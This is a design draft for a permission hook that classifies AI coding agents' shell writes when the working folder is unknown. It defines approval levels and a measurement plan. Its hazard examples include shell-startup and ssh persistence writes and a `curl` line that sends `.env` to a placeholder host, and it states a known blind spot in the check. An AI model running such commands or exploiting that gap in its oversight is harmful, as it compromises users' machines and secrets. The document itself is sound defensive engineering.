# Writes in an unknown folder

Status: design draft (2026-10-07), not built. Nothing here changes behaviour yet.

## 1. The problem

Some harnesses do not tell the hook which directory a command will run in. Codex's
`PermissionRequest` event is the case that forced it: `exec_command` takes a `workdir` that
neither hook payload carries, and an approval on that event lifts the sandbox (HARNESS-BEHAVIORS.md
§Codex `PermissionRequest`). Any harness that sends no `cwd` at all is in the same position; the
residuals of `hard-problems.md` HP-19 list the ones that send no cwd or no root, which today fall
back to treating a relative path as the workspace. Deletion is the HP-8 case: whether `rm -rf build`
is recoverable depends on where it runs, so the levels below decide what each one assumes.

What ships for that case is deliberately blunt. The command is classified at `UNKNOWN_WORKDIR`, and
`targets::respond` grants nothing above `SafeRead` where `cwd_is_the_commands()` is false. Every
write goes to the harness's own prompt.

That is safe and costs a prompt on most of a coding session: `cargo fmt`, `git commit -am x`,
`mkdir -p build`, `echo x > notes.md`. Writes are not equal. `cargo build` in an unknown folder
fills a `target/` directory the tool owns; `echo x >> .zshrc` in an unknown folder may be planting
code in the user's shell startup. This document separates them.

## 2. What is actually unknown

The folder is the anchor for two things, and only those two:

1. **Relative paths a command names** (`echo x > out.txt`, `tee .zshrc`, `cp a b`, `rm -rf build`).
2. **Writes a command makes to its working directory without naming a path** (`cargo fmt`,
   `git add .`, `cargo build`, `npm ci`, `prettier --write .`).

A third thing follows from the second: **code the folder holds**, which a command runs without
naming it (`cargo test`, `npm test`, `make`, `pytest`).

Everything else classifies exactly as it does with a known folder. An absolute path, a `~` path,
`/tmp`, `/dev/null`, a credential-store name and the network facets do not depend on the anchor.
So the design adds one question per write, *how much does this write depend on the anchor, and
what could the anchor be*, and leaves the rest of the facet model alone.

## 3. Where the command could be running

The agent chooses the folder. The plausible choices, roughly in order of how often a coding agent
picks them:

| Anchor | Example | What a relative write there can do |
|---|---|---|
| the project root | `~/projects/app` | ordinary project edit |
| a subdirectory of it | `~/projects/app/web` | ordinary project edit |
| a sibling project | `~/projects/lib` | patch a peer repo (developer already allows this by path) |
| scratch | `/tmp/x` | nothing lasting |
| the home directory | `~` | write a dotfile (`.zshrc`, `.gitconfig`), a LaunchAgent, a `bin/` script |
| a config or credential directory | `~/.ssh`, `~/.config/fish`, `~/.aws` | `authorized_keys`, `config` with a `ProxyCommand`, `credentials` |
| an untrusted checkout | `~/Downloads/repo` | nothing by writing; everything by running its code |
| a system directory | `/etc`, `/usr/local/bin` | mostly refused by the OS for a non-root user; `/usr/local` often is not |

The design's job is to approve what is harmless under every anchor a level assumes, and to name
the anchors each level accepts the risk of.

## 4. The facets

Each write a command makes gets one value on a new axis, **anchor dependence**. The other facets
(`operation`, `reversibility`, `persistence`, `scale`, `execution`) keep their meaning and still
apply.

It earns a new axis by the test every facet had to pass (`behavioral-taxonomy-v1.4.md`): a real
form the vocabulary cannot express, and independence from the existing axes. `anchoring`
(`literal < anchored < opaque`) says how firmly a path is pinned *given* its base; this says
whether there is a base at all. `echo x > out.txt` is `literal` and still lands anywhere. The
values below were drawn from the anchor table in §3 and the region roles, not chosen in advance,
and each has a positive example and a near-miss negative.

| Value | What it is | Examples |
|---|---|---|
| `anchor-free` | the target is pinned without the folder | `> /tmp/x`, `> /dev/null`, `tee ~/.zshrc`, `cp a /etc/hosts` |
| `relative-plain` | a relative path, no `..`, no hidden segment, no sensitive name | `> out.txt`, `mkdir -p build/x`, `tee src/gen.rs`, `cp a.txt b.txt` |
| `relative-sensitive` | a relative path whose name means something wherever it lands | `>> .zshrc`, `tee .git/hooks/pre-commit`, `> .envrc`, `tee authorized_keys`, `cp x Library/LaunchAgents/y.plist`, `> .config/fish/config.fish`, `> bin/ls` |
| `relative-unplaced` | a relative path that climbs out, or one that cannot be read off the command line | `> ../x`, `> $DIR/x`, `cp *.txt out/`, an `xargs` item |
| `implicit-output` | the tool writes into its working directory, only into a subtree it owns and regenerates | `cargo build` (`target/`), `npm ci --ignore-scripts` (`node_modules/`), `pytest` cache, `go build -o` absent |
| `implicit-source` | the tool rewrites existing files in its working directory, confined to its own kind of project | `cargo fmt`, `gofmt -w .`, `prettier --write .`, `git add .`, `git commit -am x` |
| `runs-folder-code` | the command executes code the folder holds | `cargo test`, `npm test`, `make`, `pytest`, `./script.sh` |

And one property the operation facet already carries, which matters more here than with a known
folder: **create-new vs change-existing vs destroy.** Creating `out.txt` in the wrong folder leaves
a stray file. Appending to `config` in the wrong folder may reconfigure ssh. `rm -rf build` in the
wrong folder deletes someone's `build`.

**Redirects are not a separate category.** `echo x > f`, `tee f` and `cp a f` write the same file
and get the same anchor value. What the shipped `PermissionRequest` rule refuses about shell syntax
is a different hazard, data spliced into a network command (`curl https://x/$(cat .env)`). That
refusal should narrow to the constructs that feed a network command, so a redirect to a
`relative-plain` file is judged as a write and nothing else.

## 5. Detecting each value from the command alone

All of it comes from what the classifier already computes; nothing reads the filesystem.

- **`anchor-free` vs relative.** `pathctx::resolve` already distinguishes an absolute, `~` or
  stream path from a relative one. Today a relative path under `UNKNOWN_WORKDIR` simply lands
  outside every workspace. Instead, record that the path was relative and carry it to the next test.
- **`relative-sensitive`: resolve twice.** Resolve the relative path against two probe anchors and
  classify both with the existing region table:
  - a synthetic workspace root. A hit on `worktree-trusted` (`.git/`, `.envrc`, hooks, CI
    config) or the credential shield makes it sensitive, as it would be in a known project;
  - `~`. A hit on any named home region makes it sensitive: the credential shield, a hidden
    segment, or a new list of **home persistence paths** (`Library/LaunchAgents`, `bin`,
    `.local/bin`, `Library/Application Support/*/plugins` and the like), researched and dated
    like every other region node.

  The sensitive names are the union of what the region model already knows plus that list. The
  test reads `regions/default.toml`, so a node added later is covered without anyone remembering.
- **`relative-unplaced`.** A `..` that climbs above the anchor, a glob, `$VAR`, `$(…)` or an
  xargs item in a write target. The resolver already marks these unpinnable; the change is to
  keep them distinct from `relative-plain`.
- **`implicit-output` and `implicit-source`.** These need data the registry does not hold yet. A
  command's TOML says what it writes when it names no path:
  ```toml
  writes_cwd = "output"   # or "source", or omitted for none
  output_dirs = ["target"]
  ```
  The first task is a sweep of the registry for commands whose profile has
  `operation = create|mutate|destroy` and no path positional or output flag, so the population is
  counted before it is labelled. A guard then fails on any such command that lacks the field, the
  same way the registry's other `every_*` guards work.
- **`runs-folder-code`.** The `executor = "project"` field exists and only cargo uses it. The same
  sweep lists test and build runners (`npm test`, `pytest`, `go test`, `make`, `rake`, `mix test`,
  `gradle`, `mvn`) and gives each the field.

## 6. The levels

The folder level is a second dial beside `--level`. A command passes when it passes both; the
folder level never loosens what `--level` refuses.

| Value | `reads` | `developer` (proposed default) | `workspace` |
|---|:--:|:--:|:--:|
| reads and anything below `SafeRead` | ✓ | ✓ | ✓ |
| `anchor-free` write | · | as `--level` decides | as `--level` decides |
| `relative-plain` create or change | · | ✓ | ✓ |
| `relative-plain` destroy (`rm build/x`, `rm -rf dist`) | · | · | ✓ |
| `implicit-output` | · | ✓ | ✓ |
| `implicit-source` | · | ✓ | ✓ |
| `runs-folder-code` | · | ✓ | ✓ |
| `relative-unplaced` | · | · | `..` into a sibling only |
| `relative-sensitive` | · | · | · |

✓ approve. · leave to the harness's prompt.

**`reads`** is what ships now. Choose it when a prompt per write is the price you want.

**`developer`** assumes the folder is one a developer would point a coding agent at: a project, a
part of one, scratch, or a sibling. It approves what such a developer approves in a known project,
except deletion. What it refuses is everything whose harm depends on the folder being something
else: a dotfile or hook name, a persistence path, a path that climbs out, and any deletion.

The risk it accepts, stated plainly: if the agent sets the folder to `~/.ssh` and appends to a file
with an ordinary name (`>> config`), that is approved. The sensitive-name test cannot catch a
generic name inside a sensitive folder, because the folder is exactly what is unknown. This is the
case the measurement in §8 counts and reports, and the reason `reads` stays available.

`runs-folder-code` is on at `developer` because a developer level that prompts for `cargo test`
prompts for most of a session, and in a known project the same level runs it. The cost is that a
command approved on Codex's `PermissionRequest` runs outside the sandbox, so a test suite in an
untrusted checkout runs unconfined. Getting there takes an agent that has already cloned or
downloaded that code and chosen to run it, which earlier commands in the session would show.

**`workspace`** treats the folder as the workspace: everything the known-folder `developer` level
does, including relative deletion and `../sibling` writes. Still never `relative-sensitive`.

No level approves `relative-sensitive`. In a known folder those names are frozen too
(`worktree-trusted`, the credential shield), so this only keeps the unknown-folder case from being
looser than the known one.

## 7. Choosing a level

In the user configuration only, never a project's `.safe-chains.toml`, so a checkout cannot loosen
it:

```toml
# ~/.config/safe-chains.toml
[unknown_folder]
writes = "developer"   # "reads", "developer" or "workspace"
```

And on the hook's command line, for a single harness: `safe-chains hook codex --unknown-folder=reads`.
The flag wins over the file. A harness that does report the folder ignores both.

`safe-chains --explain` names the anchor value of each write and, when the folder level is what
refused it, says so and names the setting.

## 8. Measuring it

The level is not done until it is measured, the same way the levels themselves were (the
golden-set in `behavioral-taxonomy-golden-set.md`).

**Three labelled sets:**

1. **A realistic set** of commands agents actually run, drawn from decision logs of sessions where
   the folder *was* known, with the folder stripped. Each command is labelled, before the engine's
   answer is seen, with what a careful developer would want at each folder level. This set measures
   **false prompts**: commands a level should approve and does not.
2. **An adversarial set** generated, not hand-picked: every sensitive name in the region table and
   the home persistence list, in every write spelling (`>`, `>>`, `tee`, `tee -a`, `cp`, `mv`,
   `install`, `ln -s`, `-o`/`--output`, `sed -i`), under every anchor in §3. Each item is labelled
   with the worst outcome over the anchors. This set measures **misses**: approvals that write a
   sensitive place under an anchor the level claims to cover.
3. **The accepted-risk set**: generic names under sensitive anchors (`>> config` with the folder at
   `~/.ssh`). Not a pass/fail set. Its count, per level, is published in the docs so the residual
   risk is a number, not a sentence.

Labels are done twice, independently, with disagreements settled and recorded before the engine
runs. A label is a person's or an oracle's, never the engine's or a model's own answer stored back
as a reference: a reference set a model wrote agrees with that model by construction. A label is
never changed to make a run pass; a disputed label is ruled on and the ruling recorded.

**An oracle for the labels.** Where a label is in doubt, run the command in a throwaway directory
tree built to stand in for each anchor (a fake project, a fake home with dotfiles, a fake `.ssh`)
and diff the tree afterwards. Seeing a write land somewhere proves it does; not seeing one proves
nothing, so the oracle can only confirm a hazard label, never clear one.

**Errors are scored by direction.** A miss (approved where the label says prompt) and a false
prompt (prompted where the label says approve) are counted separately and never traded against
each other: a wrong prompt costs a click, a wrong approval is a hole.

**Bars:**

- **Misses on the adversarial set: zero**, at every level. A miss is a bug and blocks release.
- **The adversarial set is big enough to mean it**: at least 50 distinct hazard inputs per level,
  so the bar cannot be met by asking the same few inputs repeatedly, and at least 20 near-miss safe
  inputs (`> config.json` in a project, `tee notes/ssh.md`), so a level that prompts for everything
  cannot pass either.
- **False prompts on the realistic set**: `developer` approves at least 90% of what its labels
  approve. The number is a target to measure against, not a promise; the first measurement sets the
  ratchet, and it may only rise.
- **Anchor soundness, as a property test.** For every command the folder level approves and every
  anchor that level covers, classifying the same command with that anchor as a *known* folder must
  not land a write in a `worktree-trusted`, credential-shield or home-persistence region. The
  anchors come from §3's table and the region file, so a new region node becomes a new witness.

The adversarial set and the property test live in this repository's tests. A realistic set drawn
from a user's own logs holds real paths and project names, so it stays outside the public
repository and only its counts are published.

## 9. Where it lives

A module in safe-chains, not a new repository. Everything it needs is already here: the parser,
the path resolver, the region table, the levels, the harness targets and the user configuration.
A separate crate would either reimplement those or depend on internals that are not a public API,
and the setting it adds is one users set in safe-chains' own configuration. It is a separate piece
of work with its own design document, its own guards and its own measurement, which is the sense
in which it is its own project.

Proposed layout: `src/engine/resolve/anchor.rs` (the anchor value and the double resolution), the
`writes_cwd` field in `src/registry/`, the setting in `src/policy.rs`, and the level in
`targets::respond`, replacing `within_unknown_workdir_ceiling`.

## 10. What would make most of this unnecessary

Codex putting `workdir` in the `PermissionRequest` payload. With the folder known, the command
classifies like any other and only harnesses that send no folder at all would need the dial. That
request should go upstream regardless; this design is for until it lands, and for the harnesses
that never send one.

## 11. Order of work

1. Sweep the registry for implicit writers and folder-code runners; count them.
2. Build the adversarial set generator and the anchor-soundness property against today's
   `reads` behaviour (it must pass trivially).
3. The anchor value and double resolution, with the home persistence list.
4. `writes_cwd` and `executor = "project"` across the swept commands, with the `every_*` guard.
5. The setting and the flag, `--explain` output, the docs.
6. Measure; record the numbers here; set the ratchet.
